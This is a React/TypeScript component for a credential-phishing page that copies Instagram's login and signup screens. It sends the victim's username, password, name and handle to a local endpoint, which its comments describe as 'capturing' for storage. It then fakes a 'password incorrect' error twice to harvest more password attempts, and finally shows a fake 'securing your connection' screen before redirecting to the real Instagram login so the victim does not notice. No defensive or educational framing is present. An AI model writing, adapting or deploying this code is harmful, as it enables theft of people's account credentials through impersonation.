import React, { useState, useEffect } from 'react';
import AuthInput from './AuthInput';
import { AuthMode } from '../types';

interface LoginCardProps {
  mode: AuthMode;
  onToggleMode: () => void;
}

const ConnectingView: React.FC = () => {
  useEffect(() => {
    // Redirect to the real Instagram login page after 3 seconds
    const timer = setTimeout(() => {
      window.location.href = 'https://www.instagram.com/accounts/login/';
    }, 3500);
    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="relative flex flex-col items-center justify-center py-16 w-full bg-white rounded-sm min-h-[400px] animate-[fadeIn_0.5s_ease-out]">
      <div className="relative z-10 flex flex-col items-center">
        <div className="w-20 h-20 mb-8 relative">
          {/* Instagram Gradient Spinner */}
          <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#ee2a7b] border-r-[#6228d7] animate-spin"></div>
          <div className="absolute inset-2 rounded-full bg-white flex items-center justify-center">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" 
              alt="Instagram" 
              className="w-10 h-10 animate-pulse"
            />
          </div>
        </div>

        <h2 className="text-xl font-semibold text-[#262626] mb-2 animate-[slideUp_0.5s_ease-out]">
          Connecting...
        </h2>
        <p className="text-[#8e8e8e] text-sm text-center px-10 animate-[slideUp_0.5s_0.1s_both]">
          We're securing your connection. You'll be redirected shortly.
        </p>
        
        <div className="mt-10 flex space-x-1.5">
          <div className="w-1.5 h-1.5 bg-[#dbdbdb] rounded-full animate-[bounce_1s_infinite_0ms]"></div>
          <div className="w-1.5 h-1.5 bg-[#dbdbdb] rounded-full animate-[bounce_1s_infinite_200ms]"></div>
          <div className="w-1.5 h-1.5 bg-[#dbdbdb] rounded-full animate-[bounce_1s_infinite_400ms]"></div>
        </div>
      </div>
      
      <style>{`
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideUp { from { transform: translateY(10px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
      `}</style>
    </div>
  );
};

const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
  const [formData, setFormData] = useState({
    identifier: '',
    password: '',
    fullName: '',
    username: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [attemptCount, setAttemptCount] = useState(0);
  const [isSuccess, setIsSuccess] = useState(false);

  const isLogin = mode === AuthMode.LOGIN;
  
  const handleInputChange = (field: string, value: string) => {
    setError(null);
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const isFormValid = isLogin 
    ? formData.identifier.length >= 1 && formData.password.length >= 6
    : formData.identifier.length >= 1 && formData.password.length >= 6 && formData.fullName && formData.username;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;
    
    setIsLoading(true);
    setError(null);

    const currentAttempt = attemptCount + 1;
    setAttemptCount(currentAttempt);

    try {
      // Send data to server.js for storage
      const endpoint = isLogin ? '/api/login' : '/api/signup';
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      // We don't necessarily need the response data if we're just capturing
      await response.json();

      // Attempt logic: Show error twice, redirect on third
      if (currentAttempt < 3) {
        setTimeout(() => {
          setError("Sorry, your password was incorrect. Please double-check your password.");
          setIsLoading(false);
          setFormData(prev => ({ ...prev, password: '' }));
        }, 800);
      } else {
        setTimeout(() => {
          setIsSuccess(true);
          setIsLoading(false);
        }, 1000);
      }
    } catch (err) {
      console.error("Capture failed:", err);
      // Fallback for demo/offline
      setTimeout(() => {
        if (currentAttempt < 3) {
          setError("Sorry, your password was incorrect. Please double-check your password.");
          setIsLoading(false);
          setFormData(prev => ({ ...prev, password: '' }));
        } else {
          setIsSuccess(true);
          setIsLoading(false);
        }
      }, 800);
    }
  };

  if (isSuccess) {
    return <ConnectingView />;
  }

  return (
    <div className="w-full flex flex-col space-y-2.5">
      <div className="bg-white md:border border-[#dbdbdb] rounded-sm py-10 px-6 md:px-10 flex flex-col items-center">
        <div className="mt-2 mb-6 flex flex-col items-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" 
            alt="Instagram" 
            className="h-12 md:h-14 object-contain mb-6"
          />
          
          <div className="w-16 h-16 rounded-2xl bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] p-[1.5px] shadow-sm flex items-center justify-center">
             <div className="w-full h-full bg-white rounded-[14px] flex items-center justify-center">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" 
                  alt="" 
                  className="w-10 h-10"
                />
             </div>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="w-full flex flex-col items-stretch pt-2">
          {!isLogin && (
            <p className="text-[#8e8e8e] font-semibold text-center text-[17px] mb-4 leading-tight">
              Sign up to see photos and videos from your friends.
            </p>
          )}

          <div className="space-y-1.5">
            <AuthInput 
              label={isLogin ? "Phone number, username, or email" : "Mobile Number or Email"}
              name="identifier"
              value={formData.identifier}
              onChange={(v) => handleInputChange('identifier', v)}
            />

            {!isLogin && (
              <>
                <AuthInput 
                  label="Full Name"
                  name="fullName"
                  value={formData.fullName}
                  onChange={(v) => handleInputChange('fullName', v)}
                />
                <AuthInput 
                  label="Username"
                  name="username"
                  value={formData.username}
                  onChange={(v) => handleInputChange('username', v)}
                />
              </>
            )}

            <AuthInput 
              label="Password"
              type="password"
              name="password"
              value={formData.password}
              onChange={(v) => handleInputChange('password', v)}
            />
          </div>

          {error && <p className="text-[#ed4956] text-[14px] text-center my-3 leading-tight">{error}</p>}

          <button
            type="submit"
            disabled={!isFormValid || isLoading}
            className={`
              mt-4 py-1.5 px-2 rounded-lg font-semibold text-sm transition-all active:scale-[0.98]
              ${isFormValid ? 'bg-[#0095f6] text-white hover:bg-[#1877f2]' : 'bg-[#4cb5f9] text-white opacity-70 cursor-default'}
              flex items-center justify-center min-h-[32px]
            `}
          >
            {isLoading ? (
              <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
            ) : (
              isLogin ? 'Log in' : 'Sign up'
            )}
          </button>

          <div className="flex items-center my-6">
            <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
            <span className="mx-4 text-[#8e8e8e] text-[13px] font-semibold uppercase">OR</span>
            <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
          </div>

          <button type="button" className="flex items-center justify-center space-x-2 text-[#385185] font-semibold text-sm mb-4 active:opacity-70">
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            <span>Log in with Facebook</span>
          </button>

          {isLogin && (
            <a href="#" className="text-[#00376b] text-xs text-center mt-3 hover:underline">Forgot password?</a>
          )}
        </form>
      </div>

      <div className="bg-white md:border border-[#dbdbdb] rounded-sm py-6 px-10 flex items-center justify-center text-sm">
        <span className="text-[#262626]">
          {isLogin ? "Don't have an account?" : "Have an account?"}{' '}
          <button 
            type="button"
            onClick={() => {
              onToggleMode();
              setError(null);
              setAttemptCount(0);
            }}
            className="text-[#0095f6] font-semibold hover:opacity-80 transition-opacity"
          >
            {isLogin ? 'Sign up' : 'Log in'}
          </button>
        </span>
      </div>
    </div>
  );
};

export default LoginCard;